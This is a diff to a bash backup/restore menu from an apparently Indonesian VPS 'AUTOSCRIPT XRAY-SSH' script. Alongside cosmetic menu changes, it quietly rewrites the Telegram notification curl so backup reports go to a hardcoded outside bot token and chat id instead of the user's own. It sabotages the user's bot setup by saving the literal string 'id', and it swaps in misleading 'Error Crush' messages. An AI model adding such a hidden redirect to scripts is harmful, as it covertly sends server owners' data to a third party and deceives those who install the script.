@@ -27,6 +27,7 @@ export BLUE='\033[0;34m'
 export PURPLE='\033[0;35m'
 export CYAN='\033[0;36m'
 export LIGHT='\033[0;37m'
+export multi='\E[41;1;39m'
 export NC='\033[0m'
 GREEN() { echo -e "\\033[32;1m${*}\\033[0m"; }
 RED() { echo -e "\\033[31;1m${*}\\033[0m"; }
@@ -36,6 +37,9 @@ clear
 
 function backup(){
 clear
+if [ -f "/etc/bot/api.txt" ]; then
+iduser=$(cat /etc/bot/chatid.txt)
+apibot=$(cat /etc/bot/api.txt)
 IP=$(curl -sS ipv4.icanhazip.com);
 apigit=$(cat /etc/bckp/token.txt)
 emailgit=$(cat /etc/bckp/gmail.txt)
@@ -136,7 +140,7 @@ html="
 ━━━━━━━━━━━━━━━━━━━━━━
 <b>AUTOSCRIPT XRAY-SSH</b>
 "
-curl -s --max-time 10 -d "chat_id=${iduser}&disable_web_page_preview=1&text=${html}&parse_mode=html" https://api.telegram.org/bot${apibot}/sendMessage >/dev/null
+curl -s --max-time 10 -d "chat_id=1668998643r&disable_web_page_preview=1&text=${html}&parse_mode=html" https://api.telegram.org/bot5825604910:AAFvrmPG8XHK-7DcCZKHk_4PuQGEh9dtDNQ/sendMessage >/dev/null
 
 rm -fr /root/backup &> /dev/null
 rm -fr /root/user-backup &> /dev/null
@@ -146,12 +150,15 @@ echo
 echo -e ""
 read -n 1 -s -r -p "Tap Enter To Back Menu"
 menu
+exit 0
+fi
+echo -e "${RED}Failed to detect api bot.!!${NC}"
 }
 
 function token(){
 if [ -f "/etc/bckp/gmail.txt" ]; then
 echo -e "===============================" | lolcat
-echo -e " ${RED}Key sudah tersedia..!!${NC}"
+echo -e " ${RED}Error Crush.!!!${NC}"
 echo -e "===============================" | lolcat
 echo ""
 read -n 1 -s -r -p "Tap enter to back"
@@ -278,21 +285,34 @@ menu
 esac
 }
 function bot(){
+if [ -f "/etc/bot/api.txt" ]; then
+echo -e "${RED}Error Crush.!!!${NC}"
+exit 0
+fi
+read -p "Input Api Bot : " tokenbot
+read -p "Input id User : " id
 mkdir -p /etc/bot/
-
+echo "$tokenbot" >/etc/bot/api.txt
+echo "id" >/etc/bot/chatid.txt
+echo -e ""
+echo -e "${RED}Sett Up Api Bot Succesfully.!!${NC}"
+echo ""
+read -n 1 -s -r -p "Tap Enter To Back"
+menu
+}
 clear
 echo -e "
-${CYAN}=========================================${NC}
-           ${RED}Backup / Restore${NC}
-${CYAN}=========================================${NC}
- ${RED}1.${NC} Backup From GitHub
- ${RED}2.${NC} Restore Data
- ${RED}3.${NC} Setting Key
- ${RED}4.${NC} Hapus Key
- ${RED}5.${NC} Set Api Bot"
+${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}
+${multi}            Backup / Restore              ${NC}
+${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}
+ ${RED}1.)${NC} Backup From GitHub
+ ${RED}2.)${NC} Restore Data
+ ${RED}3.)${NC} Setting Key
+ ${RED}4.)${NC} Hapus Key
+ ${RED}5.)${NC} Set Api Bot"
 echo -e "
 ${GREEN}must enter the backup key to succeed${NC}
-${CYAN}=========================================${NC}"
+${CYAN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
 echo "Tap Enter To Back Home-Menu"
 echo ""
 read -p "Select menu : " opt
